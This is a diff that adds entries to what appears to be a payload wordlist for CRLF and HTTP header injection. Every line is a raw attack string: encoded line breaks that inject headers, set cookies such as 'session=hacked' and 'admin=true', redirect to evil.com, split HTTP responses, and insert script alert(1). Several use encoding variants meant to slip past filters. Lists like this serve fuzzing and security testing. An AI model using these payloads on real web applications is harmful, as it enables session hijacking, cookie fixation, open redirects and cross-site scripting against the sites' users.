@@ -1,3 +1,29 @@
+%0aheader:injected
+%0d%0a%0d%0a<script>alert(1)</script>
+%0d%0aAccess-Control-Allow-Origin:*
+%0d%0acontent-length:0%0d%0a%0d%0a<script>alert(1)</script>
+%0d%0acontent-type:text/html
+%0d%0aheader:injected
 %0d%0aHeader:Value
+%0d%0aHTTP/1.1 200 OK%0d%0acontent-type:text/html%0d%0a%0d%0a<script>alert(1)</script>
+%0d%0alocation:http://evil.com
+%0d%0aset-cookie:malicious=true
 %0d%0aSet-Cookie:session=hacked
+%0d%0aX-XSS-Protection:0
+%0dheader:injected
+%c4%8d%c4%8aheader:injected
+%c4%8dheader:injected
+%E5%98%8D%E5%98%8Aheader:injected
+%E5%98%8D%E5%98%8Aset-cookie:injected
+%u000d%u000aheader:injected
+/page%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0aContent-Length:21%0d%0a%0d%0a<html>injected</html>
+\nheader:injected
+\r\nheader:injected
+\r\nLocation:http://evil.com
+\r\nSet-Cookie:admin=true
 \r\nSet-Cookie:session=hacked
+\u000d\u000aheader:injected
+foo%0abar:baz
+foo%0d%0abar:baz
+value%0d%0aHTTP/1.1 200%0d%0acontent-type:text/html%0d%0acontent-length:21%0d%0a%0d%0a<script>alert(1)</script>
+value%0d%0aX-injected:yes
